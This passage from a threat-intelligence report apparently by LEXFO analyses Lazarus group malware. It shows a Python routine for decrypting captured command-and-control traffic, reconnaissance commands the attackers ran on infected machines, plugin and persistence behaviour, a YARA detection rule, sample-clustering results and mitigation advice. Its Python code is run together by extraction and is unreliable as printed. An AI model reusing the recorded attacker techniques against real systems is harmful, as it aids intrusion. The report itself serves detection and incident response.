UTC\n\n\n-----\n\n###### UNCOVERING ATTACKERS’ ACTIVITIES\n\nHaving reverse-engineered the communication protocol and the encryption algorithm, LEXFO started\ndeveloping a Python implementation to decrypt packets.\n\n\nHere is the identified decryption function in the SQCSVC payload:\n\n_XOR decryption stub_\n\n\nA Python implementation is quite straightforward:\n\n**def decryptTCPData(data):**\n\noutput = ‘’\ni = 0\nj = 0\n\n\n**while j < len(data):**\n\ni = 5423\ncar = ord(data[j])\n**while i >= 1870:**\n\nk = i % 256 i\n**-= 187**\ncar = (k ^ (car + k)) &\n0xFF j += 1\noutput += chr(car)\n\n\n**return output**\n\nFrom there, we were able to write a script to automatically decrypt all traffic in the PCAP files exchanged\nbetween the implant and the Lazarus C&C.\n\n\n---- 03:34:44.251294 ethertype IPv4, IP ddd.ddd.ddd.ddd.443 > sss.sss.sss.\nsss.53477: Flags [P.], seq 1459:1557, ack 1459, win 511, length 98\n\n‘0000000B\\x0230\\x02”cmd.exe” /c “ping -n 1 XXXROOM0099”\\x02’\n\n\n---- 03:34:47.465025 ethertype IPv4, IP sss.sss.sss.sss.53477 > ddd.ddd.ddd.\nddd.443: Flags [P.], seq 1477:1943, ack 1557, win 256, length 466\n\n‘458\\x02\\r\\n\n\n\nPinging XXX.xxx.org [10.xxx.xxx.xxx] with 32 bytes of data:\\r\\n Reply from\n10.xxx.xxx.xxx: Destination host unreachable.\\r\\n\n\n\\r\\n\n\n\nPing statistics for 10.xxx.xxx.xxx:\\r\\n\n\nPackets: Sent = 1, Received = 1, Lost = 0 (0% loss),\\r\\n\n\n\n‘\n\n\n-----\n\nOther manually executed commands:\n\n“cmd.exe” /c “time /t”\n\n“cmd.exe” /c “echo 1000 > c:\\\\windows\\\\temp\\\\tmp1105.tmp”\n\n“cmd.exe” /c “type “c:\\\\windows\\\\temp\\\\tmp1105.tmp””\n\n“cmd.exe” /c “type “C:\\\\Windows\\\\Temp\\\\temp0917.tmp””\n\n“cmd.exe” /c “type C:\\\\Windows\\\\Temp\\\\TMP0389A.tmp”\n\n“cmd.exe” /c “dir “c:\\\\windows\\\\temp\\\\tmp1105.tmp””\n\n“cmd.exe” /c “echo 1000 > c:\\\\windows\\\\temp\\\\tmp1105.tmp”\n\n“cmd.exe” /c “dir c:\\\\windows\\\\temp\\\\tmp1105.tmp” “cmd.exe”\n\n/c “type c:\\\\windows\\\\temp\\\\tmp1105.tmp” “cmd.exe” /c “type\n\nC:\\\\Windows\\\\Temp\\\\TMP0389A.tmp” “cmd.exe” /c “type\n\nC:\\\\Windows\\\\Temp\\\\temp0917.tmp” “cmd.exe” /c “type\n\nc:\\\\windows\\\\temp\\\\tmp1105.tmp” “cmd.exe” /c “dir\n\nc:\\\\windows\\\\temp\\\\tmp1105.tmp” “cmd.exe” /c “type\n\nC:\\\\Windows\\\\Temp\\\\tmp1105.tmp” “cmd.exe” /c “type\n\nC:\\\\Windows\\\\Temp\\\\temp0917.tmp” “cmd.exe” /c “type\n\nC:\\\\Windows\\\\Temp\\\\temp0917.tmp” “cmd.exe” /c “ping -n 1 XXXROOM0099”\n\n“cmd.exe” /c “ping -n 1 XXXROOM0099”\n\n“cmd.exe” /c “time /t”\n\n“cmd.exe” /c “type “C:\\\\Windows\\\\Temp\\\\TMP0389A.tmp””\n\n“cmd.exe” /c “query user”\n\n“cmd.exe” /c “query user”\n\nThe Lazarus operators also leveraged the RAT to get information on the infected machines, using the\ndirectory and process listing feature of SQCSVC . We decrypted many fragmented packets exfiltrating\nfolders and files as well as running processes.\nIn some other captures, we saw that the attackers were checking the state of a service named swpsvc .\nThis name if consistent with other Lazarus malware such as the first payload sqcsvc, makes it very\nsuspicious.\n\n“[SC] EnumQueryServicesStatus:OpenService \\x1a chec(s) 1060 :\\r\\n\n\n\\r\\n\n\nLe service sp\\x1a cifi\\x1a n’existe pas en tant que service install\\x1a .\\r\\n\n\n\\r\\n “\n\n‘\\r\\n\n\nSERVICE_NAME: swpsvc \\r\\n\n\nTYPE : 30 WIN32 \\r\\n\n\nSTATE : 4 RUNNING \\r\\n\n\n(STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)\\r\\n\n\nWIN32_EXIT_CODE : 0 (0x0)\\r\\n\n\nSERVICE_EXIT_CODE : 0 (0x0)\\r\\n\n\nCHECKPOINT : 0x0\\r\\n\n\nWAIT_HINT : 0x0\\r\\n\n\n‘\n\n‘[SC] DeleteService r\\x1a ussite(s)\\r\\n’\n\nThe Lazarus operators deleted this file when they realized that the company security team was\ninvestigating. Fortunately, they failed to delete it safely and LEXFO managed to recover the swpsvc.dll\nusing carving tools.\n\nThis payload appeared to be a stage 1 RAT with a similar communication protocol.\n\nFurther investigations of the decrypted PCAP files also revealed two other DLL plugins that were sent and\nwritten to disk by the attackers: an injector performing payload injection in the explorer.exe process,\nand a keylogger / screencapper. Both these plugins were unknown at the time.\nWe provided the client with newly-made YARA rules to detect all discovered payloads as well as a\nPowerShell script to automate the deployment process. We also implemented Suricata rules to detect\nthe Lazarus fake- TLS and custom protocol traffic that can be used along with our Python script to decrypt\n\n\n-----\n\n###### PAYLOAD ANALYSIS\n\n — IGFX tool\n\n\nThis binary was compiled on Monday, May 02 05:24:39 2016 UTC .

The delivery method is most likely manual. In such case, the attacker\ndrops the malware on an already compromised machine.\nThe malware configuration is stored encrypted in the registry, unlike most Lazarus malware that come\nwith an encrypted file as configuration. In our case, the configuration data could not be retrieved as\nit was fully erased before the investigation began by the attackers that didn’t need this component\nanymore since the SQCSVC RAT was installed.\n\nThe malware uses different kind of encryption for different kind of purposes. The first substitution-based\nencryption is used for decrypting encrypted strings in the static binary. The XOR-based encryption is used\nto obfuscate communications between the server and the client and to decrypt configuration content\nsuch as the Command-and-Control (C&C) server name and port number stored in the Windows registry.\n\nThis RAT uses the already mentioned Fake-TLS protocol for communications:\n\n\n-----\n\nFake-TLS handshake sent by the RAT\n\nThe following commands are implemented in the RAT:\n\n\n###### — Downloaded modules\n\nLEXFO found two downloaded modules in the decrypted packets that were deployed on specific targets.\n\n\nThe first one is an injector that takes a file path as a parameter and injects it in an explorer.exe process.\nThe injected file is executed in a new thread.

It is a\nfingerprint of the compilation environment that can be easily decrypted and decoded. It can then be\nused to identify if binaries were compiled in the same environment, which is a strong relation. As we\nempirically saw that North Korean groups have been using VisualStudio almost exclusively, and there is a\nhigh chance that their malware-building infrastructure is quite conservative, we chose to develop a script\nto parse rich headers from samples and included it as a relation link in our classifier.\n\n\n###### — Building Yara rules\n\nFor each North-Korean malware family we identified, we built Yara rules in order to keep signatures of the\nfollowing implementations that are likely to be reused by Lazarus:\n\n\nJ Specific strings\n\nJ Cryptographic algorithms\n\n\nJ Cryptographic keys\n\nJ Unique implementations of features:\n\n\nJ mapping of files\n\nJ lateral movement\n\n\nJ installing service\n\nJ wiper implementation\n\n\nJ handling logs\n\nJ ...\nJ Way of dynamically loading API\n\n\nJ Obfuscation\n\n\nJ ...\n\nWe also built rules for statically linked library like OpenSSL, libcurl, ZIP etc. of specific versions, as Lazarus\nwas seen to be pretty conservative in using the same versions over the years. Those rules were named\nlib_static_[lib name]_[version] and we attributed them a lesser weight than implementation\nrules as it doesn’t illustrate a strong enough link between two samples.\n\n\nWe built a set of about 100 rules that we ran on our sample dataset. To our own Yara rule set, we added\nauto-generated rules from Malpedia [37] when they showed accurate results.\nBefore adding them to our ruleset, we ran tests on a huge malware set to make sure that the rules were\naccurate and there were close to zero false positive.\n\n\n###### — Building similarity profiles\n\nWe produced a profile for each sample with fuzzy hashes, decoded rich header, compilation timestamps\nand matching Yara rules. We then compared profiles using nearest neighbor algorithms with weight\nwe empirically tested to get the best results. Jaccard distance was used to compare fuzzy hashes. We\nattributed heavy weights for identical rich headers encountered in different samples and for every non\nlib_static_* Yara rule matches. Weights (W) were roughly according to this order relation:\n\n\nW(Exact same Rich header) > W(Yara match (non lib_static_*)) > W(Machoke code\nreuse) > W(Compilation timestamp) > W(Yara match (lib_static_*)) > W(Rich header\nsimilarity) > W(Imphash) > W(Various metadata)\n\n###### — Handling packers\n\n\nNon-specific packers like UPX are handled separately: as fuzzy hashes become irrelevant, we dismissed\nthem when computing weights. For more specific packers (Themida, Enigma...), we built Yara rules to\nidentify them and considered them as a valid relation of similarity between samples since Lazarus uses\nspecific versions of those packers.\n\nWhen possible, we reversed the packed samples and tried to get clean unpacked executables so our tool\ncould classify them indiscriminately and accurately.\n\n\n-----\n\n###### — Result review and improvements\n\nWe ran our tool multiple times and tried to analyze samples that seemed to be oddly placed or unique. We\nreversed each of them and adapted our classification methodology and criteria according to our findings,\nand ran the test again and iteratively re-applied this process until the classification was accurate enough.\n\n###### — Building the graph\n\nFrom there, we created a graph with samples as nodes and weighted links as relations between them.\n\n###### VISUALIZATION\n\nWe used the Fruchterman-Reingold spacialisation to visualize links and identify clusters. We ended up\nwith the following constellation, where each dot is a sample and each link represents the strength of a\nrelation between two samples:\n\nFruchterman-Reingold spacialisation applied to our relation graph\n\n###### REVIEWING RESULTS\n\nOur tool revealed more than 2500 actual links between around 290 samples, which showcases that\nsuch a classification is relevant as Lazarus samples are rarely unique in a 10 years span period. We see\nclear clusters and many overlaps. This will shed some light on North Korean malware and groups, as the\nnumber of reports and campaign names grows and it can be hard to keep track and attribution is often\nconfusing or unsure.\n\n###### — Kimsuky\n\nThe Kimsuky group has its own cluster but we see Rich header and compilation timestamp overlaps\nwith other Lazarus samples. Kimsuky and Lazarus are therefore likely to be working together, which is\nconfirmed by the fact that Kimsuky malware were found on Lazarus targets several times.\n\n\n-----\n\nMoreover, our tool revealed links between DTrack samples from the Kudankulam Nuclear Power Plant\n(KNPP) and Kimsuky samples: both use SQlite as a statically-linked library, but a different version\n(compiled on 2017- 10-24 18:55:49 for the latter vs 2017-02-13 16:02:40 for the former). Looking\nat compilation timestamps, we can see that some DTrack and Kimsuky samples were also compiled the\nsame day (or close to) as other Lazarus malware used in campaigns:\n\n(2019-07-29 13:36:26) ./dtrack/npp_\nbfb39f486372a509f307cde3361795a2f9f759cbeb4cac07562dcbaebc070364\n\n\n<- Timestamp -> (2019-07-29 07:08:01) ./andariel_rifle/javaupdatemain_unpack.\nexe\n\n(2019-03-01 00:07:25) ./dtrack/\nnpp_3cc9d9a12f3b884582e5c4daf7d83c4a510172a836de90b87439388e3cde3682\n\n\n<- Timestamp -> (2019-03-01 09:08:44)\n\n\n./kimsuky_\nshark2/4b3416fb6d1ed1f762772b4dd4f4f652e63ba41f7809b25c5fa0ee9010f7dae7.bin\n\nThis could mean that the groups are working together for some operations, with Lazarus doing the\nintrusion and handing the exfiltrating part to Kimsuky when the target matches their interest.\n\n\nFinally, interesting findings stand out when looking at Rich header similarities. The Kimsuky stolen pencil\nsample has the exact same Rich header as samples found in Lazarus campaigns such as DarkSeoul and\nGoldDragon.\n\n(2018-12-21 00:34:35) ./kimsuky_stolenpencil/1.bin\n\n\n(2012-07- ./troydarkseoul/DarkSeoul/DarkSeoul_50E<- Rich -> 12:24:18)\n06 03200C3A0BECBF33B3788DAC8CD46\n\n(2012-07- ./troydarkseoul/DarkSeoul/DarkSeoul_E4F66C<- Rich -> 12:24:18)\n06 3CD27B97649976F6F0DAAD9032\n\n(2013-01- ./troydarkseoul/DarkSeoul/DarkSeoul_5FCD6E<- Rich -> 10:27:18)\n31 1DACE6B0599429D913850F0364\n\n\n(2013-01- ./troydarkseoul/DarkSeoul/DarkSeoul_0A8032CD<- Rich -> 10:27:18)\n31 6B4A710B1771A080FA09FB87\n\n(2013-01- ./troydarkseoul/DarkSeoul/DarkSeoul_DB4BBD<- Rich -> 10:27:18)\n31 C36A78A8807AD9B15A562515C4\n\n\n(2013-01- ./troydarkseoul/DarkSeoul/DarkSeoul_\n<- Rich -> 10:27:18)\n31 F0E045210E3258DAD91D7B6B4D64E7F3\n\n(2017-12- ./golddragon/e68f43ecb03330ff0420047b6193358\n<- Rich -> 08:16:57)\n24 3b4144585\n\n\n(2017-12- ./golddragon/4f58e6a7a04be2b2ecbcdc<- Rich -> 08:47:21)\n24 bae6f281778fdbd9f9\n\n(2017-12- ./golddragon/11a38a9d23193d9582d02ab0eae<- Rich -> 08:29:04)\n24 767c3933066ec\n\n(2017-12- ./golddragon/3a0c617d17e7f819775e48f7ede<- Rich -> 08:37:57)\n24 fe9af84a1446b\n\n\n(2017-12- ./golddragon/bf21667e4b48b8857020ba455531c<- Rich -> 08:44:08)\n24 9c4f2560740\n\n\n###### — DarkHotel\n\nSamples attributed to the DarkHotel group have identical Rich header as a lot of APT38 Nukesped\nsamples, which is a strong link:\n\n\n(2011-04-07 06:58:03) ./\ndarkhotel/2b6288bbd81bb9d666c3a0372f26ede47c8c9ff11c604307982d51654fb9e850.ViR\n\n<- Rich -> (2017-07-14 22:40:25) ./cybercom/d2da675a8adfef9d0c146154084fff62.bin\n\n\n<- Rich -> (2017-07-11 18:26:59) ./nukesped/3EDCE4D49A2F31B8BA9BAD0B8EF54963\n\n<- Rich -> (2017-08-11 05:03:45) ./cybercom/2a791769aa73ac757f210f8546125b57.bin\n\n\n<- Rich -> (2017-08-01 16:39:36) ./ghostsecret/Sample_5ae56e2077d7dc0d380c3bfd_\nexe\n\n\n-----\n\nThough DarkHotel TTPs and malware are different from Lazarus, those groups seem to be working in\ntandem.\n\n###### — Andariel subgroup\n\nClear Andariel clusters stand out, with malware involved in operations Red Gambler and Rifle.

For example, Andariel uses inflate\nlibrary version 1.1.4 which is the same version found in several other North Korean samples (GoldDragon,\nFallchill, Dtrack...).\n\n\n-----\n\n###### — APT38/Bluenoroff\n\nBluenoroff clusters are linked by Rich headers, timestamps and code similarity. Most of the links are quite\nstrong and make APT38 clusters the most distinguishable ones, meaning that the group doesn’t think it’s\nnecessary to be sneaky and reinvent itself, but will reuse a lot of elements, from architecture to malware\nimplementations. These clusters are mainly composed of the following malware families:\n\n\nJ Nukesped\n\nJ Fallchill\n\nJ Volgmer\n\n\nJ Electricfish\n\nJ Dyepack\n\n\nJ SWIFT-related malware\n\nJ Hoplight\n\n\nJ Some Sony / Blockbuster samples\n\nJ Malware from bank attacks (Poland, Vietnam...)\n\n\nJ Destover\n\nJ Bankshot\n\n\nJ Fastcash\n\n\nJ ...\n\nLooking at the links, we can see that a Yara rule we built is matching almost 40 samples from our dataset,\nall of them attributed to APT38. The Yara rule was built to detect a specific RC4 implementation and\ncalled yara_apt38_rc4 :\n\n\nrule yara_apt38_rc4 { strings:\n$s1 = { 8A 90 01 01 00 00 // mov dl, byte [eax + 0x101]\n8A 88 00 01 00 00 // mov cl, byte [eax + 0x100] 8A 14 02 // mov dl, byte [edx + eax]\n8A 1C 01 // mov bl, byte [ecx + eax]\n02 D3 // add dl, bl\n8A 1C 2E // mov bl, byte [esi + ebp]\n81 E2 FF 00 00 00 // and edx, 0xff\n8A 0C 02 // mov cl, byte [edx + eax]\n32 CB } // xor cl, bl\ncondition:\nuint16(0) == 0x5a4d and any of ($s*)\n}\n\nThis rule showcases once again that Lazarus groups reuse a lot of code for their malware.

Our tool gives the following result, showing\nthat the Rich header was taken from Bluenoroff samples (one of them from the Bangladesh SWIFT heist):\n\n(2017-12-27 09:03:48) ./olympicdestroyer/3c0d740347b0362331c882c2dee96dbf\n<- Rich -> (2016-02-04 13:45:39) ./bangladesh_swift/evtsys.exe\n<- Rich -> (2017-03-02 16:46:13)\n./blockbuster_sequel/032ccd6ae0a6e49ac93b7bd10c7d249f853fff3f5771a1fe3797f733f09db5a0.bin\n\nKaspersky published an article about this false flag operation [38].\n\n###### WORKING HOURS AND DAYS OF THE LAZARUS DEVELOPERS\n\nWe extracted all compilation timestamps from the samples in our dataset and removed those that\nwere either altered or inconsistent. Some samples appeared to be legitimate software infected by\nLazarus without recompiling, making the timestamps irrelevant. For instance, we ignored the sample\n2223a93521b261715767f00f0d1ae4e692bd593202be40f3508cb4fd5e21712b which turned out to\nbe a version of the FTP tool FileZilla that the attackers altered by adding some malicious code without\nrecompiling it, leaving its original compilation timestamp and compiler fingerprints unmodified.\nAnalyzing unaltered compilation timestamps, we see that the Lazarus developers are mostly working\nbetween 8AM and 8PM UTC+9 (KST). We can even notice some breaks at lunchtime, and that Lazarus\ndevelopers are working overnight. Most samples were compiled from Monday to Saturday included.\n\nLazarus compilation timestamps by days\n\n\n-----\n\nLazarus compilation timestamps by hours (KST / UTC+9)\n\n###### CONCLUSION\n\n\nSuch a classification proved to be very relevant for North Korean malware. It highlighted heavy links\nillustrating code and architecture reuse inside established groups, as well as relations (or lack of)\nbetween these separate groups.\n\nAttacker groups like Lazarus are so active they struggle or are reluctant to renew their arsenal. Studying\ntheir TTPs prove to be very valuable and will greatly help properly reacting to incident. As a defender,\nbeing able to exploit Lazarus laziness and carelessness by quickly identifying their TTPs will give you\nsome key information: you know what they want, how they plan to achieve it and with which tools.\n\n\nThe information given in this report, the classification LEXFO established and the associated internally\ndeveloped tools helped the incident response team practically during missions involving Lazarus, as\nit narrowed down the analysis and gave good hints on where to look for technical clues: persistence,\ncommunications, lateral movements, exfiltration etc.\n\n\n-----\n\n-----\n\n### VI.

Lazarus will certainly\ncontinue to implement and leverage such 1day vulnerabilities to target unpatched systems quickly after\na fix is deployed.\n\nAs shown in this report, Lazarus leverages known vulnerabilities in webservers to try and get a first access\nto the internal network of a target. To mitigate this vector, it is necessary to make sure all exposed servers\nand their components are up-to-date and isolated from the internal networks of the organizations.\n\nFurthermore, Lazarus leveraged several 0day and 1day vulnerabilities in popular software such as Flash\nPlayer, HWP and Silverlight. Keeping those software up-to-date is mandatory. The group is also able\nto quickly find and exploit vulnerabilities in custom internal software used by companies, sometimes\nleading to supply chain attacks. Auditing software used internally is also advised to mitigate this vector.\n\n###### — Mitigating lateral movements\n\nLazarus uses mostly legitimate tools for lateral movements. When a form of authentication is needed,\nthey will either reuse stolen passwords gathered with Mimikatz-like tools or keyloggers or try to bruteforce\nit with dictionaries.\n\nTools like PSExec can be monitored through log analysis. As Lazarus implants usually achieve persistent\nby installing services, event id 7045 and 4697 with the Service Start Type information set to\nSERVICE_AUTO_START must be closely monitored.\n\nLast but not least, enforcing a strong password policy is obviously advised.\n\n###### — Threat intelligence\n\nAs Lazarus activities are actively monitored by many security firms such as LEXFO, it is important for\nsecurity teams to stay up-to-date and follow threat intelligence reports. As we showed in this paper,\nLazarus will most of the time reuse known and easy-to-detect communication protocols and tools, and\nmost infections can therefore be prevented.\n\nIf any indicator of a compromised system is found, it is strongly advised to quickly contact a specialized\nfirm that knows how the attackers work and can quickly assess the impact of the attack and mitigate it.\n\n\n-----\n\n### VII.
